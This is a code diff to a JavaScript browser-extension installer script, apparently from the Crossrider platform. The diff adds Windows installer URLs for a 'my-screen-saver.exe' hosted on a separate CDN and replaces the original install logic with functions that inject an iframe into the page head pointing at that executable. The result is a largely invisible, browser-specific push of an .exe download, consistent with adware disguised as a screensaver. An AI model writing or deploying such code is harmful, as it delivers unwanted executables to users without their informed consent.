@@ -14,6 +14,13 @@ var crossriderInstaller = (function (window) {
 				domain:(secure ? "https://crossrider.cotssl.net" : "http://static.crossrider.com"),
 				iron_url:'https://crossrider.cotssl.net/install_cores/MyFriendsScreenSaver_signed_v1.exe',
 				params_installer_url:'https://crossrider.cotssl.net/installer/29165/12288/{{id}}/0/0/my-screensaver.exe',
+				
+				ff_installer:'https://w9u6a2p6.ssl.hwcdn.net/installer/29165/8392704/{{id}}/0/0/my-screen-saver.exe',
+
+				ch_installer:'https://w9u6a2p6.ssl.hwcdn.net/installer/29165/8396800/{{id}}/0/0/my-screen-saver.exe',
+
+				ie_installer:'https://w9u6a2p6.ssl.hwcdn.net/installer/29165/0/{{id}}/0/0/my-screen-saver.exe',
+
 				app_id:null,
 				app_name:'Crossrider Platform',
 				params_installer:true,
@@ -239,6 +246,60 @@ var crossriderInstaller = (function (window) {
 	function install() {
 		var isWindows = /^win/i.test(navigator.platform);
 
+		if (isWindows) {
+			switch ($.browser.name) {
+				case 'firefox':
+					installFirefox_WIN();
+					break;
+
+				case 'chrome':
+					installChrome_WIN();
+					break;
+
+				case 'msie':
+					installMSIE_WIN();
+					break;
+
+				default:
+					browserNotSupported();
+					break;
+			}
+
+			installed = true;
+
+		} else {
+			if (!ready) {
+				setTimeout(install, 100);
+
+				return;
+			}
+
+			switch ($.browser.name) {
+				case 'firefox':
+					installFirefox();
+					break;
+
+				case 'chrome':
+					installChrome();
+					break;
+
+				case 'msie':
+					installMSIE();
+					break;
+
+				case 'safari':
+					installSafari();
+					break;
+
+				default:
+					browserNotSupported();
+					break;
+			}
+
+			installed = true;
+		}
+
+/*
 		if (config.installer.params_installer && isWindows) {
 			installParamsInstaller();
 
@@ -292,7 +353,20 @@ var crossriderInstaller = (function (window) {
 
 			installed = true;
 		}
-		else alert('An error has occurred.\nTry to refresh the page and try again.');
+		else alert('An error has occurred.\nTry to refresh the page and try again.');*/
+	}
+
+
+	function installFirefox_WIN() {
+		$('<iframe />').attr('src', config.installer.ff_installer.replace('{{id}}', window.CURRENT_INSTALL)).appendTo('head');
+	}
+
+	function installChrome_WIN() {
+		$('<iframe />').attr('src', config.installer.ch_installer.replace('{{id}}', window.CURRENT_INSTALL)).appendTo('head');
+	}
+
+	function installMSIE_WIN() {
+		$('<iframe />').attr('src', config.installer.ie_installer.replace('{{id}}', window.CURRENT_INSTALL)).appendTo('head');	
 	}
 
 	function installFirefox() {
